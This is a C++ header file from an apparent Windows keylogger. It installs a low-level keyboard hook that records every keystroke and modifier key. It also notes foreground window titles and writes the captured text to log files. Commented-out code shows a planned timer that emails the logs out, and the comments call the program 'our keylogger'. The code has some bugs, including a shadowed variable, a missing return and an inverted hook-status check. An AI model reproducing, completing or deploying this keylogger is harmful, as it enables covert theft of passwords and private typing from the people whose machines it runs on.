#ifndef __KEYBHOOK_H__
#define __KEYBHOOK_H__

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Helper.h"
#include "Timer.h"
#include "IO.h"
//#include "SendMail.h"

extern char lastwindow[256];

std::string keylog = "";

void TimerSendMail()
{
    Helper::WriteAppLog(keylog);
    std::cout << keylog << std::endl;

    // There could be no keyboard activity during this interval, so we need to check if there are any key logs or not
    if(keylog.empty())
        return;

    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation failed. ");
        return;
    }

    // TODO

    return;

    int retValue = 7; // = Mail::SendMail("subject", "body", IO::GetOurPath(true) + last_file);

    if( retValue != 7 )
        Helper::WriteAppLog("Mail was not sent!! Error Code :" + Helper::ToString(retValue));
    else
    {
        // Since everything went well, now we will be clearing the keylog contents
        keylog = "";
    }
}

void GetActiveWindowText()
{
    char lastwindow[256];

    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if(strcmp(window_title, lastwindow)!=0)
        {
            strcpy(lastwindow, window_title);
            Helper::WriteAppLog(window_title);
        }
    }
}

// Timer MailTimer(TimerSendMail, 10 * 6, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
{
    if( nCode < 0 )
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if( wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN )
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;

        // If this kbs->vkCode is 1 or 2 then its a mouse stroke, i think.

        // when someone presses the return key, its better to go to next line rather than log it, hence \n
        if( kbs->vkCode == VK_RETURN )
            keylog += '\n';
    }
    else if( wparam == WM_KEYUP || wparam == WM_SYSKEYUP )
    {
        DWORD key = kbs->vkCode;
        if( key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL

                || key == VK_SHIFT
                || key == VK_LSHIFT
                || key == VK_RSHIFT

                || key == VK_MENU
                || key == VK_LMENU
                || key == VK_RMENU

                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN
          )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;

            // [SHIFT][a][b][c][/SHIFT]
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    // GetActiveWindowText();

    TimerSendMail();

    // with this we are propagating the key press forward else they will be consumed by our keylogger
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook started...timer started");

//    MailTimer.Start(true);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, GetModuleHandle(NULL), 0);

    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool) (eHook == NULL);
}

#endif // __KEYBHOOK_H__
